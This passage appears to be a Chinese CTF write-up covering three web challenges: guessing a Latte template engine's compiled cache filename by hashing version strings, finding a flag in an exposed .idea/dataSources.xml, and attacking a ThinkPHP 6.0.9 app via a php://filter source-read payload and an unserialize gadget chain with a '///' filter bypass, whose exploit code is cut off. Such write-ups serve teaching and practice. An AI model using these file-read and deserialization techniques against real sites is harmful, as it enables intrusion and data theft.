    $policy->allowFunctions(['trim', 'strlen']);
    $latte->setPolicy($policy);
    $latte->setSandboxMode();
    $latte->setAutoRefresh(false);
    if(isset($_FILES['file'])){
      $uploaddir = '/var/www/html/tempdir/';
      $filename = basename($_FILES['file']['name']);
      if(stristr($filename,'p') or stristr($filename,'h') or stristr($filename,'..')){
        die('no');
      }
      $file_conents = file_get_contents($_FILES['file']['tmp_name']);
      if(strlen($file_conents)>28 or stristr($file_conents,' $message,
      ];
      $latte->render('tempdir/index.latte', $params);
    }
    else if($_GET['source']==1){
      highlight_file(__FILE__);
    }
    else{
      $latte->render('tempdir/index.latte', ['message'=>'Hellow My Glzjin!']);
    }
上传对文件名，文件内容有严格过滤，文件名过滤`p`,`h`,还过滤`..`防了文件名php，目录穿越。文件内容直接过滤`
          Title
题目使用latte进行渲染，没有php文件给我们触发`.user.ini`的包含，之后在latte官网[Latte – The Safest & Truly
Intuitive Templates for PHP
(nette.org)](https://latte.nette.org/)看手册，没有找到可以利用的地方，下载源代码，进行审计。
在这里找到一个带php后缀的生成点，前后都看下，大概意思是模板渲染.latte后还会再生成一个php文件。文件名命名规则是`index.latte--xxxxxxxxxx.php`q其中xxxxxxxxxx跟latte的版本，渲染的文件的名称有关，直接分析算法有些麻烦，尝试本地搭建环境来获取这个文件名。
    public function getCacheFile(string $name): string
      {
        $hash = substr($this->getTemplateClass($name), 8);
        $base = preg_match('#([/\\\\][\w@.-]{3,35}){1,3}$#D', $name, $m)
          ? preg_replace('#[^\w@.-]+#', '-', substr($m[0], 1)) . '--'
          : '';
        return "$this->tempDirectory/$base$hash.php";
      }
      public function getTemplateClass(string $name): string
      {
        $key = serialize([$this->getLoader()->getUniqueId($name), self::VERSION, array_keys((array) $this->functions), $this->sandboxed]);
        return 'Template' . substr(md5($key), 0, 10);
      }
var_dump下`$key`的值
    a:4:{i:0;s:19:"tempdir/index.latte";i:1;s:6:"2.10.4";i:2;a:7:{i:0;s:5:"clamp";i:1;s:11:"divisibleBy";i:2;s:4:"even";i:3;s:5:"first";i:4;s:4:"last";i:5;s:3:"odd";i:6;s:5:"slice";}i:3;b:1;}
发现规律：
    a:4:{i:0;s:19:"tempdir/index.latte";i:1;s:6:"版本号";i:2;a:7:{i:0;s:5:"clamp";i:1;s:11:"divisibleBy";i:2;s:4:"even";i:3;s:5:"first";i:4;s:4:"last";i:5;s:3:"odd";i:6;s:5:"slice";}i:3;b:1;}
[github.com](https://github.com/nette/latte/releases)在github项目查看所有版本
把每个版本号放入之后md5下，取前10位作为文件命中xxxxxxxxxx的值。
手动拿网站跑一下
在尝试到2.10.4时成功
之后访问`index.latte--6f26bb0dba.php`得flag
###  灏妹的web
访问啥也没有直接上扫描器，调下速度不能太快
这几个有东西的都访问看下，`.idea/dataSources.xml`发现flag
###  EasyTp
首先看下`public`提示缺少file参数，用php伪协议读出源码
?file=php://filter/read=convert.base64-encode/resource=../app/controller/Index.php
    PD9waHAKCm5hbWVzcGFjZSBhcHBcY29udHJvbGxlcjsKCnVzZSBhcHBcQmFzZUNvbnRyb2xsZXI7CgpjbGFzcyBJbmRleCBleHRlbmRzIEJhc2VDb250cm9sbGVyCnsKICAgIHB1YmxpYyBmdW5jdGlvbiBpbmRleCgpCiAgICB7CiAgICAgICAgLy9yZXR1cm4gJzxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+KnsgcGFkZGluZzogMDsgbWFyZ2luOiAwOyB9IGRpdnsgcGFkZGluZzogNHB4IDQ4cHg7fSBhe2NvbG9yOiMyRTVDRDU7Y3Vyc29yOiBwb2ludGVyO3RleHQtZGVjb3JhdGlvbjogbm9uZX0gYTpob3Zlcnt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lOyB9IGJvZHl7IGJhY2tncm91bmQ6ICNmZmY7IGZvbnQtZmFtaWx5OiAiQ2VudHVyeSBHb3RoaWMiLCJNaWNyb3NvZnQgeWFoZWkiOyBjb2xvcjogIzMzMztmb250LXNpemU6MThweDt9IGgxeyBmb250LXNpemU6IDEwMHB4OyBmb250LXdlaWdodDogbm9ybWFsOyBtYXJnaW4tYm90dG9tOiAxMnB4OyB9IHB7IGxpbmUtaGVpZ2h0OiAxLjZlbTsgZm9udC1zaXplOiA0MnB4IH08L3N0eWxlPjxkaXYgc3R5bGU9InBhZGRpbmc6IDI0cHggNDhweDsiPiA8aDE+OikgPC9oMT48cD4gVGhpbmtQSFAgVjY8YnIvPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MzBweCI+MTPovb3liJ3lv4PkuI3mlLkgLSDkvaDlgLzlvpfkv6HotZbnmoRQSFDmoYbmnrY8L3NwYW4+PC9wPjwvZGl2PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vdGFqcy5xcS5jb20vc3RhdHM/c0lkPTY0ODkwMjY4IiBjaGFyc2V0PSJVVEYtOCI+PC9zY3JpcHQ+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9lLnRvcHRoaW5rLmNvbS9QdWJsaWMvc3RhdGljL2NsaWVudC5qcyI+PC9zY3JpcHQ+PHRoaW5rIGlkPSJlYWI0YjlmODQwNzUzZjhlNyI+PC90aGluaz4nOwogICAgICAgIGlmIChpc3NldCgkX0dFVFsnZmlsZSddKSkgewogICAgICAgICAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107CiAgICAgICAgICAgICRmaWxlID0gdHJpbSgkZmlsZSk7CiAgICAgICAgICAgICRmaWxlID0gcHJlZ19yZXBsYWNlKCcvXHMrLycsJycsJGZpbGUpOwogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvZmxhZy9pIiwkZmlsZSkpeyBkaWUoJzxoMj4gbm8gZmxhZy4uJyk7fQogICAgICAgICAgICBpZihmaWxlX2V4aXN0cygkZmlsZSkpewogICAgICAgICAgICAgICAgZWNobyAiZmlsZV9leGlzdHMoKSByZXR1cm4gdHJ1ZS4uPC9icj4iOwogICAgICAgICAgICAgICAgZGllKCAiaGFja2VyISEhIik7CiAgICAgICAgICAgIH1lbHNlIHsKICAgICAgICAgICAgICAgIGVjaG8gImZpbGVfZXhpc3RzKCkgcmV0dXJuIGZhbHNlLi4iOwogICAgICAgICAgICAgICAgQGhpZ2hsaWdodF9maWxlKCRmaWxlKTsKICAgICAgICAgICAgfQoKICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgZWNobyAiRXJyb3IhIG5vIGZpbGUgcGFyYW1ldGVyIDxici8+IjsKICAgICAgICAgICAgZWNobyAiaGlnaGxpZ2h0X2ZpbGUgRXJyb3IiOwogICAgICAgIH0KCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIHVuc2VyKCl7CiAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3Z1bHZ1bCddKSl7CiAgICAgICAgICAgICRzZXIgPSAkX0dFVFsndnVsdnVsJ107CiAgICAgICAgICAgICR2dWwgPSBwYXJzZV91cmwoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pOwogICAgICAgICAgICBwYXJzZV9zdHIoJHZ1bFsncXVlcnknXSwkcXVlcnkpOwoKICAgICAgICAgICAgZm9yZWFjaCgkcXVlcnkgYXMgJHZhbHVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvTy9pIiwkdmFsdWUpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGRpZSgnPC9icj4gPGgxPkhhY2tpbmc/Jyk7CiAgICAgICAgICAgICAgICAgICAgZXhpdCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHVuc2VyaWFsaXplKCRzZXIpOwogICAgICAgIH0KCiAgICB9Cn0K
base64解码下
     :)  ThinkPHP V613载初心不改 - 你值得信赖的PHP框架';
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                $file = trim($file);
                $file = preg_replace('/\s+/','',$file);
                if(preg_match("/flag/i",$file)){ die(' no flag..');}
                if(file_exists($file)){
                    echo "file_exists() return true..";
                    die( "hacker!!!");
                }else {
                    echo "file_exists() return false..";
                    @highlight_file($file);
                }
            } else {
                echo "Error! no file parameter ";
                echo "highlight_file Error";
            }
        }
        public function unser(){
            if(isset($_GET['vulvul'])){
                $ser = $_GET['vulvul'];
                $vul = parse_url($_SERVER['REQUEST_URI']);
                parse_str($vul['query'],$query);
                foreach($query as $value)
                {
                    if(preg_match("/O/i",$value))
                    {
                        die(' Hacking?');
                        exit();
                    }
                }
                unserialize($ser);
            }
        }
    }
审下代码有反序列化点，tp版本之前报错页面得到是6.0.9
找链子触发，题目有个过滤`O`,参考博客。利用`///`绕过。
链子用的是这条：
exp
    lazySave = true;
                $this->withEvent = false;
                $this->exists = true;
                $this->table = new Url();
                $this->force = true;
                $this->data = ["1"];
            }